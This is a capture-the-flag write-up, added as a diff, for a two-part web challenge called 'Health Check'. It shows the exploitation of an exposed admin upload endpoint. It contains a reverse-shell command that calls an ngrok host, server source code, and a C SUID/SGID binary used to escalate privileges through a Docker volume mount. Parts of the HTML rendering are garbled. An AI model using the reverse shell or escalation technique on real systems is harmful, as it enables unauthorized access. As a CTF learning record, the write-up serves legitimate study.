@@ -1,0 +1,200 @@
+<h1>Health Check</h1>
+
+<h2>Description</h2>
+
+<p>Web | 32 solves</p>
+
+<blockquote>
+  <p>Want to know whether the challenge is down or it's just your network down? Want to know who to send a message when you want to contact an admin of some challenges? Take a look at our "fastest" Health Check API in the world!</p>
+  
+  <p>Warning: Do not violate our CTF rules.</p>
+  
+  <p>Author: chiffoncake</p>
+</blockquote>
+
+<h2>Solution</h2>
+
+<h3>Health Check 1</h3>
+
+<p>Visiting the webpage, we could guess through the response headers that the server was using FastAPI. We could download <code>openapi.json</code> to see the available endpoints.</p>
+
+<p>`<code>json
+ "/new": {
+            "post": {
+                "summary": "Create Problem",
+                "description": "**This endpoint is only for admin. Do NOT share this link with players!**\n\nUpload the health check script to create a new problem. The uploaded file should be a zip file.\nThe zip file should NOT have a top-level folder. In the folder, you must place an executable (or a script) named `run`. You may put other files as you want.\nBelow is an example output of `zipinfo myzip.zip` of a valid `myzip.zip`:\n\n</code>\nArchive:  myzip.zip\nZip file size: 383 bytes, number of entries: 2\n-rwxrwxr-x  3.0 unx       84 tx defN 22-Aug-20 19:53 run\n-rw-rw-r--  3.0 unx        8 tx stor 22-Aug-20 19:53 my-env\n2 files, 92 bytes uncompressed, 89 bytes compressed:  3.3%\n<code>\n\nBelow is an example output of an invalid zip (because it has a top-level folder):\n\n</code>\nArchive:  badzip.zip\nZip file size: 553 bytes, number of entries: 3\ndrwxrwxr-x  3.0 unx        0 bx stor 22-Aug-20 19:55 badzip/\n-rw-rw-r--  3.0 unx        8 tx stor 22-Aug-20 19:55 badzip/myenv\n-rwxrwxr-x  3.0 unx       84 tx defN 22-Aug-20 19:55 badzip/run\n3 files, 92 bytes uncompressed, 89 bytes compressed:  3.3%\n``<code>\n\nEvery 30 seconds, the server will spawn a new process, cd into your folder, and run</code>./run<code>. Your</code>./run<code>should create</code>./status.json` to store the health check result, which will be returned when the players request for the status of this problem.\nIf you have any question, please contact @chiffoncake.",
+                "operationId": "create<em>problem</em>new<em>post",
+                "requestBody": {
+                    "content": {
+                        "multipart/form-data": {
+                            "schema": {
+                                "$ref": "#/components/schemas/Body</em>create<em>problem</em>new_post"
+                            }
+                        }
+                    },
+                    "required": true
+                },</p>
+
+<pre><code>            ...
+</code></pre>
+
+<p>````</p>
+
+<p>We could see the following description for the <code>/new</code> endpoint.</p>
+
+<blockquote>
+  <p><strong>This endpoint is only for admin. Do NOT share this link with players!</strong></p>
+  
+  <p>Upload the health check script to create a new problem. The uploaded file should be a zip file.</p>
+  
+  <p>The zip file should NOT have a top-level folder. In the folder, you must place an executable (or a script) named <code>run</code>. You may put other files as you want.\
+  \
+  ...</p>
+</blockquote>
+
+<p>Indeed, we could upload a zip file containing a <code>run</code> bash script that gives us a reverse shell.</p>
+
+<p>```bash</p>
+
+<h1>!/bin/sh</h1>
+
+<p>bash -c "bash -i &gt;&amp; /dev/tcp/8.tcp.ngrok.io/18920 0>&amp;1"
+```</p>
+
+<p>The first flag was readable by the <code>nobody</code> user.</p>
+
+<h3>Health Check 2</h3>
+
+<p>From our reverse shell, we could see the source code.</p>
+
+<p>```python
+import asyncio, os, pathlib, shutil, traceback
+from flag1 import flag1</p>
+
+<p>RM<em>INTERVAL = 20 * 60
+HEALTH</em>CHECK_INTERVAL = 30</p>
+
+<p>data<em>path = pathlib.Path('data')
+backup</em>path = pathlib.Path.home() / 'backup'</p>
+
+<p>async def background<em>task1():
+    while True:
+        await asyncio.sleep(RM</em>INTERVAL)
+        for path<em>name in data</em>path.iterdir():
+            try:
+                shutil.rmtree(path<em>name)
+            except:
+                traceback.print</em>exc()</p>
+
+<p>async def background<em>task2():
+    while True:
+        timer = asyncio.create</em>task(asyncio.sleep(HEALTH<em>CHECK</em>INTERVAL))
+        processes = {timer}
+        for path<em>name in data</em>path.iterdir():
+            if not path<em>name.is</em>dir():
+                continue
+            async def run(path<em>name):
+                try:
+                    if 'docker-entry' in os.listdir(path</em>name):
+                        # experimental
+                        await asyncio.create<em>subprocess</em>shell(f'sudo chmod -R a+rwx {path<em>name}; cd {path</em>name}; chmod a+x ./docker-entry; docker run --rm --cpus=".25" -m="256m" -v=$(realpath .):/data -u=user -w=/data sandbox /data/docker-entry')
+                    else:
+                        await asyncio.create<em>subprocess</em>shell(f'sudo chmod -R a+rwx {path<em>name}; cd {path</em>name}; sudo -u nobody ./run')
+                except:
+                    pass
+            processes.add(asyncio.create<em>task(run(path</em>name)))</p>
+
+<pre><code>    await asyncio.wait(processes)
+</code></pre>
+
+<p>if <strong>name</strong> == '<strong>main</strong>':
+    try:
+        os.mkdir('data')
+    except FileExistsError:
+        pass</p>
+
+<pre><code>async def run():
+    os.chmod('flag1.py', 0o440)
+    os.chmod('flag2', 0o440)
+    os.chmod('data', 0o711)
+    asyncio.create_task(background_task1())
+    await background_task2()
+
+asyncio.run(run())
+</code></pre>
+
+<p>```</p>
+
+<p>We could clearly see that if the zip file name contains <code>docker-entry</code>, then instead of running the script as the <code>nobody</code> user, we get a shell within a Docker container that has the current directory mounted to <code>/data</code>.</p>
+
+<p><code>python
+if 'docker-entry' in os.listdir(path_name):
+    # experimental
+    await asyncio.create_subprocess_shell(f'sudo chmod -R a+rwx {path_name}; cd {path_name}; chmod a+x ./docker-entry; docker run --rm --cpus=".25" -m="256m" -v=$(realpath .):/data -u=user -w=/data sandbox /data/docker-entry')
+else:
+    await asyncio.create_subprocess_shell(f'sudo chmod -R a+rwx {path_name}; cd {path_name}; sudo -u nobody ./run')
+</code></p>
+
+<p>Let's take a step back - we now have a way of gaining a shell <em>both inside and outside</em> of the Docker container. The shell inside the container has higher privileges than the one outside (the one inside runs as the <code>uploaded</code> user, while the one outside runs as the <code>nobody</code> user).</p>
+
+<p>I compiled a binary that sets the effective user and group IDs to that of the SUID and SGID permissions, then compiled it and gave it SUID and SGID permissions with <code>chmod u+s exp</code> and <code>chmod g+s exp</code>.</p>
+
+<p>```c</p>
+
+<h1>include <stdio.h></h1>
+
+<h1>include <stdlib.h></h1>
+
+<h1>include <sys/types.h></h1>
+
+<h1>include <unistd.h></h1>
+
+<h1>include <errno.h></h1>
+
+<p>int main()
+{
+    int t;
+    printf("before, geteuid() returned %d\n", geteuid());
+    printf("before, getuid() returned %d\n", getuid());</p>
+
+<pre><code>t = setuid(geteuid());
+if (t &lt; 0) {
+    perror("Error with setuid() - errno " + errno);
+    exit(1);
+}
+
+printf("before, getegid() returned %d\n", getegid());
+printf("before, getgid() returned %d\n", getgid());
+
+t = setgid(getegid());
+if (t &lt; 0) {
+    perror("Error with setgid() - errno " + errno);
+    exit(1);
+}
+
+printf("after, geteuid() returned %d\n", geteuid());
+printf("after, getuid() returned %d\n", getuid());
+
+printf("after, getegid() returned %d\n", getegid());
+printf("after, getgid() returned %d\n", getgid());
+
+setreuid(geteuid(), geteuid());
+setregid(getegid(), getegid());
+
+printf("finally, geteuid() returned %d\n", geteuid());
+printf("finally, getuid() returned %d\n", getuid());
+
+printf("finally, getegid() returned %d\n", getegid());
+printf("finally, getgid() returned %d\n", getgid());
+
+printf("did work fine, look who I am:\n");
+system("/bin/bash -c whoami");
+system("/bin/bash");
+</code></pre>
+
+<p>}
+```</p>
+
+<p>This gives us the flag!</p>
+
+<figure><img src="../../.gitbook/assets/Screenshot 2022-09-04 at 11.45.12 AM.png" alt=""><figcaption></figcaption></figure>
